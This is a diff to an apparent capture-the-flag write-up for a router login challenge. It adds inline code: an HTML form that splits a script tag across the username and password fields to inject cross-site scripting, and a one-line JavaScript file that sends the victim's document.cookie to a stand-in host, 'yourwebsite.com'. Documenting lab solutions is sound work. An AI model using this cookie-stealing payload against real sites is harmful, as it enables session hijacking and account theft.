@@ -35,9 +35,25 @@ NOTE: The website must have an SSL certificate. An easy way to do this is to use
 
 We only need two files for this, a `js` and `html` file. The Javascript file's only job is to redirect the user to a URL and pass along their cookies. The HTML file will contain an exact copy of the login form located on the challenges page. Our form will submit the values of the `username` and `password` fields, set to our payload above, to the login form on `https://router-ui.web.ctfcompetition.com/login`. When submitted, our script will be loaded, thus sending the user's cookies to us.
 
-<script src="https://gist.github.com/c3bd628bb16ea4cac13fe2ec741bb109.js"></script>
+`index.html`
+```html
+<html>
+    <head></head>
+    <body>
+        <form name="login" class="form-signin" action="https://router-ui.web.ctfcompetition.com/login" method="post">
+            <h1 class="h3 mb-3 font-weight-normal">OffHub Management Interface</h1>
+            <input type="text" name="username" class="form-control" placeholder="username" value="<script src='https:">
+            <input type="password" name="password" class="form-control" placeholder="password" value="yourwebsite.com/cookie.js'></script>">
+            <button class="btn btn-block" type="submit">Sign in</button>
+        </form>
+    </body>
+</html>
+```
 
-<script src="https://gist.github.com/b09e02aba41c19f629cef68162f90fa4.js"></script>
+`cookie.js`
+```javascript
+document.location = 'https://yourwebsite.com/cookie.html?' + document.cookie;
+```
 
 Our Javascript file is sending the user to a nonexistent page, which is fine since the request will be logged, allowing us to view the cookies being passed with it.
 
